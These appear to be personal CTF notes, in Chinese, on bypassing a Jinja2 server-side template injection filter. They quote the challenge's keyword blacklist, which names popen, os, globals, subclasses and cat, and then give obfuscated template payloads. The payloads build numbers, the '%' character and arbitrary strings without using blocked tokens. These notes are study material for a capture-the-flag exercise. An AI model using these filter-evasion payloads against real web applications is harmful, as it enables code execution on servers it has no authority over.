tags:: [[CTF/SSTI/Jinja]]

- # waf
	- ```python
	  blacklist = [
	      # 普通ban符号
	      '_', '\\', '\'', '"', '[', ']', '~', "+",
	      # 一堆奇葩ban
	      '-', ':', '/', '*',
	      # 正常keyword ban
	      'request', 'class', 'init', 'arg', 'config', 'app', 'self', 'chr',
	      'request', 'url', 'builtins', 'globals', 'base', 'pop', 'popen', 'subclasses',
	      'flashed', 'os', 'open', 'read', 'cd', 'cat',  'getitem', 
	      # ???
	      'count', 'not', 'index','length', 'ord', 'import',
	      # ????
	      '124', '47', '59', '99', '100', '37', '94', '96', '0', '38',
	  ]
	  
	  ```
	- 可以看到filter还是可以用的
- # 针对两位数字的waf
	- 原版本中针对数字生成的规则还是太少，焚靖生成的数字表达式要么太长，要么无法绕过
	- 这里可以用`(8,8,8,8,8)|sum`的形式计算出需要的数字，成功绕过
- # 针对字符`%`的waf
	- 需要在使用时手动加入变量
		- ```python
		  full_payload_gen.add_context_variable("{%set unn=(lipsum|escape|batch(22)|list|first|last)%}{%set ppp=(((lipsum|attr(((unn,unn,({}|select()|trim|list|batch(2)|first|last),(dict|trim|list|batch(3)|first|last),({}|select()|trim|list|batch(9)|first|last),({}|select()|trim|list|batch(13)|first|last),(dict|trim|list|batch(4)|first|last),(dict|trim|list|batch(3)|first|last),(dict|trim|list|batch(5)|first|last),unn,unn)|join)))|attr(((unn,unn,({}|select()|trim|list|batch(2)|first|last),({}|select()|trim|list|batch(3)|first|last),(dict|trim|list|batch(12)|first|last),(lipsum|trim|list|batch(7)|first|last),(dict|trim|list|batch(12)|first|last),({}|select()|trim|list|batch(3)|first|last),(lipsum|trim|list|batch(24)|first|last),unn,unn)|join)))(((unn,unn,({}|select()|trim|list|batch(13)|first|last),(lipsum|trim|list|batch(3)|first|last),(lipsum|trim|list|batch(7)|first|last),(dict|trim|list|batch(3)|first|last),(dict|trim|list|batch(12)|first|last),(lipsum|trim|list|batch(7)|first|last),({}|select()|trim|list|batch(4)|first|last),(dict|trim|list|batch(5)|first|last),unn,unn)|join))|attr(((unn,unn,({}|select()|trim|list|batch(2)|first|last),({}|select()|trim|list|batch(3)|first|last),(dict|trim|list|batch(12)|first|last),(lipsum|trim|list|batch(7)|first|last),(dict|trim|list|batch(12)|first|last),({}|select()|trim|list|batch(3)|first|last),(lipsum|trim|list|batch(24)|first|last),unn,unn)|join)))((((dict|trim|list|batch(2)|first|last),(dict(h=x)|join),({}|select()|trim|list|batch(6)|first|last))|join))((31,6)|sum)%}{%set pppc=()%}", {
		      "ppp": "%"
		  })
		  ```
	- ~~现阶段还没有可以绕过的方法~~请看VCR：
		- ```jinja2
		  {%set prrc=((dict(dict(dict(a=1)|tojson|batch(2))|batch(2))|join,(dict(c=x)|join),dict()|trim|last)|join).format(((9,9,9,1,9)|sum))%}
		  ```
	- 有了`%`就有`%c`，就可以生成任意字符串了，剩下的就不用多说了
- # 针对任意字符生成的waf
	- `[`被封，可以使用`batch(INDEX)|first|last`的形式获得列表的第i个元素
- # 针对字符拼接的waf
	- 可以使用`(unn,unn)|join`的形式进行绕过
	- 还可以使用`|replace` filter将一个字符串拼接在另一个字符串的前面
-